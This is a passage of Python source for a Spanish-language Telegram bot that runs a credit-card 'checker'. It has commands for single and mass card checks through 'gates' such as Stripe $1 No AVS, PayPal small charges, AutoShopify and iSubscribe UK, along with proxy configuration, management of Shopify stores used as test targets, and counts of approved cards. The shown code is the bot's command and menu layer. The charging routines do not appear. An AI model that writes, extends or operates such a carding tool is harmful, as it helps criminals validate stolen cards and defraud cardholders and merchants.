        proxy = message.text.split()[1]
        proxy_actual = proxy
        bot.reply_to(message, f"✅ Proxy configurado: {proxy}")
    except:
        bot.reply_to(message, "❌ Uso: /proxy ip:puerto o ip:puerto:user:pass")

@bot.message_handler(commands=['cleansites'])
def cmd_clean_sites(message):
    msg = bot.reply_to(message, "🧹 Limpiando sitios muertos...")
    try:
        eliminados = limpiar_sitios_muertos()
        restantes = len(obtener_sitios())
        texto = f"""🧹 LIMPIEZA COMPLETADA
━━━━━━━━━━━━━━━━━━━━━━
🗑️ Sitios eliminados: {eliminados}
📌 Sitios restantes: {restantes}"""
        bot.edit_message_text(texto, message.chat.id, msg.message_id)
    except Exception as e:
        bot.edit_message_text(f"❌ Error: {e}", message.chat.id, msg.message_id)

@bot.message_handler(commands=['stats'])
def cmd_stats(message):
    stats = obtener_estadisticas()
    texto = f"""
📊 ESTADÍSTICAS GLOBALES
━━━━━━━━━━━━━━━━━━━━━━
🌐 PROXIES: {stats['proxies']} | ✅ {stats['exits_proxy']} | ❌ {stats['fallos_proxy']}
🛍️ SITIOS: {stats['sitios']} | ✅ {stats['exits_sitio']} | ❌ {stats['fallos_sitio']}
💳 TARJETAS: {stats['tarjetas']}
📝 VERIFICACIONES: {stats['checks']} | ✅ {stats['aprobadas']}
━━━━━━━━━━━━━━━━━━━━━━"""
    bot.send_message(message.chat.id, texto)

@bot.message_handler(commands=['addsh'])
def cmd_add_sitio(message):
    """Agrega un sitio Shopify"""
    try:
        url = message.text.split()[1]
        if guardar_sitio(url):
            bot.reply_to(message, f"✅ Sitio guardado:\n{url}")
        else:
            bot.reply_to(message, "❌ Error: El sitio ya existe o URL inválida")
    except IndexError:
        bot.reply_to(message, "❌ Uso: /addsh https://tienda.myshopify.com")

@bot.message_handler(commands=['sitios'])
def cmd_listar_sitios(message):
    """Lista todos los sitios Shopify"""
    sitios = obtener_sitios_con_estadisticas()
    
    if not sitios:
        bot.send_message(message.chat.id, "📭 No hay sitios guardados")
        return
    
    texto = "╔════════════════════════════╗\n║     🛍️ MIS SITIOS        ║\n╠════════════════════════════╣\n"
    
    for url, succ, fail, last_used in sitios[:10]:
        url_short = url[:25] + "..." if len(url) > 25 else url
        total = succ + fail
        tasa = (succ/total*100) if total > 0 else 0
        
        texto += f"║ {url_short:<28} ║\n║    ├─ ✅ {succ}  ❌ {fail}        ║\n║    └─ 📊 {tasa:.1f}%            ║\n"
    
    texto += "╚════════════════════════════╝"
    bot.send_message(message.chat.id, texto, reply_markup=menu_shopify())

@bot.message_handler(commands=['delsh'])
def cmd_del_sitio(message):
    """Elimina un sitio Shopify"""
    try:
        url = message.text.split()[1]
        if eliminar_sitio(url):
            bot.reply_to(message, f"✅ Sitio eliminado: {url[:30]}...")
        else:
            bot.reply_to(message, "❌ Sitio no encontrado")
    except IndexError:
        bot.reply_to(message, "❌ Uso: /delsh https://tienda.myshopify.com")

@bot.message_handler(commands=['delallsitios'])
def cmd_del_all_sitios(message):
    """Elimina TODOS los sitios"""
    confirmacion = types.InlineKeyboardMarkup()
    btn1 = types.InlineKeyboardButton("✅ Sí, eliminar todos", callback_data='confirm_del_all_sitios')
    btn2 = types.InlineKeyboardButton("❌ No, cancelar", callback_data='cancel_del_all_sitios')
    confirmacion.add(btn1, btn2)
    
    bot.reply_to(
        message, 
        "⚠️ *¿ESTÁS SEGURO?*\n\nEsto eliminará TODOS los sitios guardados permanentemente.",
        parse_mode='Markdown',
        reply_markup=confirmacion
    )

@bot.message_handler(func=lambda m: m.text and m.text.startswith('/cancelar_'))
def cancelar_tarea(message):
    task_id = message.text.replace('/cancelar_', '')
    if task_id in active_tasks:
        active_tasks[task_id]['cancel'] = True
        bot.reply_to(message, f"🛑 Cancelando tarea {task_id}...")
    else:
        bot.reply_to(message, f"❌ Tarea no encontrada")

@bot.message_handler(func=lambda m: True)
def default(message):
    bot.reply_to(message, "❓ Usa /menu para ver los comandos")

# ==================== CALLBACKS ====================

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    if call.data == 'volver_principal':
        bot.edit_message_text("Selecciona una opción:", call.message.chat.id, call.message.message_id, reply_markup=menu_principal())
    
    elif call.data == 'menu_stripe':
        bot.send_message(call.message.chat.id, "💳 Stripe $1 No AVS\n/check5 CC\n\nMasivo: /mass")
    
    elif call.data == 'menu_paypal':
        bot.send_message(call.message.chat.id, "💰 PayPal:\n/pp $10\n/pp2 $0.10\n/pp3 $1\n\nMasivo: /mpp")
    
    elif call.data == 'menu_shopify':
        bot.send_message(call.message.chat.id, "🛍️ AutoShopify\n/sh CC\n\nMasivo: /msh")
    
    elif call.data == 'menu_isubscribe':
        bot.send_message(call.message.chat.id, "🇬🇧 iSubscribe UK £4\n/uk CC\n\nMasivo: /muk")
    
    elif call.data == 'menu_stats':
        cmd_stats(call.message)
    
    elif call.data == 'menu_proxies':
        bot.send_message(call.message.chat.id, "🌐 Proxies:\n/px - Test rápido\n/proxy PROXY - Configurar")
    
    elif call.data == 'confirm_del_all_sitios':
        cantidad = eliminar_todos_sitios()
        bot.answer_callback_query(call.id, f"🗑️ Se eliminaron {cantidad} sitios")
        bot.edit_message_text("✅ Todos los sitios han sido eliminados", call.message.chat.id, call.message.message_id)
    
    elif call.data == 'cancel_del_all_sitios':
        bot.answer_callback_query(call.id, "❌ Operación cancelada")
        bot.edit_message_text("✅ Operación cancelada", call.message.chat.id, call.message.message_id)

# ==================== INICIAR BOT ====================
if __name__ == "__main__":
    print("="*70)
    print("🤖 AUTO SHOPIFY BOT - VERSIÓN COMPLETA")
    print("="*70)
    print("✅ Token configurado")
    print("✅ Gates disponibles:")
    print("   • Stripe $1 No AVS  → /check5")
    print("   • PayPal            → /pp, /pp2, /pp3")
    print("   • AutoShopify       → /sh")
    print("   • iSubscribe UK £4  → /uk (NUEVO!)")
    print("="*70)
    print("✅ Comandos masivos:")
    print("   • Stripe     → /mass")
    print("   • PayPal     → /mpp")
    print("   • Shopify    → /msh")
    print("   • iSubscribe → /muk (NUEVO!)")
    print("="*70)
    print("✅ Proxies:")
    print("   • /px - Test ULTRA RÁPIDO")
    print("="*70)
    print("✅ Sitios Shopify:")
    print("   • /addsh, /sitios, /delsh, /delallsitios, /cleansites")
    print("="*70)
    print("📱 Bot iniciado. Presiona Ctrl+C para detener")
    print("="*70)
    
    while True:
        try:
            bot.infinity_polling(timeout=60, long_polling_timeout=60, skip_pending=True)
        except Exception as e:
            print(f"❌ Error en polling: {e}")
            print("🔄 Reintentando en 5 segundos...")
            time.sleep(5)
